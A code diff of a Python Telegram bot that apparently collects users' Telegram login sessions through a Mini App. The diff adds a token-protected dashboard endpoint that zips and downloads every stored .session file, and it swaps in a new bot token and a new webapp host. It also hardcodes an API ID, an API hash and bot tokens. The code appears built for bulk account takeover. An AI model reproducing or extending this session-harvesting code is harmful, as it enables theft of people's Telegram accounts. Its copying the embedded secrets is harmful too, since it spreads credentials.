@@ -1,6 +1,8 @@
 import time
 import os
 import sys
+import io
+import zipfile
 from collections import deque
 import asyncio
 import random
@@ -34,10 +36,10 @@ from telegram.ext import (
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 API_ID = 35214126
 API_HASH = "332680c93c1cd23f6d2a9a5d3c990c48"
-BOT_TOKEN = "8904307171:AAFMdgtwktRqFxAtWwmb4GPI3a7voItsQis"
+BOT_TOKEN = "8969700396:AAE9Km7v_ngbzIov2EIavgT4e9U7v_Ak_lk"
 
 # ⚠️ URL HTTPS do Mini App (domínio)
-WEBAPP_URL = "https://qualquerum.shop/webapp"
+WEBAPP_URL = "https://botcoletor-production.up.railway.app/webapp"
 WEBAPP_PORT = 8080
 
 CODE_TTL = 180
@@ -901,6 +903,36 @@ async def api_dashboard_cleanup(request):
     print(f"[CLEANUP] 🧹 {removed} sessões banidas removidas")
     return web.json_response({"ok": True, "removed": removed})
 
+async def api_dashboard_download_sessions(request):
+    """Gera um ZIP com todas as sessões .session e retorna para download"""
+    token = request.query.get("token", "")
+    if token != DASHBOARD_TOKEN:
+        return web.json_response({"error": "Acesso negado"}, status=403)
+
+    sessions_dir = os.path.join(BASE_DIR, "sessions")
+    session_files = [f for f in os.listdir(sessions_dir) if f.endswith(".session")]
+
+    if not session_files:
+        return web.json_response({"error": "Nenhuma sessão encontrada"}, status=404)
+
+    # Cria o ZIP em memória
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+        for fname in session_files:
+            filepath = os.path.join(sessions_dir, fname)
+            zf.write(filepath, fname)
+
+    buf.seek(0)
+    print(f"[DASHBOARD] 📦 Download de {len(session_files)} sessões solicitado")
+
+    return web.Response(
+        body=buf.read(),
+        content_type="application/zip",
+        headers={
+            "Content-Disposition": f'attachment; filename="sessions_{len(session_files)}.zip"'
+        },
+    )
+
 # ===============================
 # MAIN
 # ===============================
@@ -919,6 +951,7 @@ async def main():
     web_app.router.add_get("/api/dashboard", api_dashboard)
     web_app.router.add_get("/api/dashboard/logs", api_dashboard_logs)
     web_app.router.add_post("/api/dashboard/cleanup", api_dashboard_cleanup)
+    web_app.router.add_get("/api/dashboard/download-sessions", api_dashboard_download_sessions)
 
     runner = web.AppRunner(web_app)
     await runner.setup()
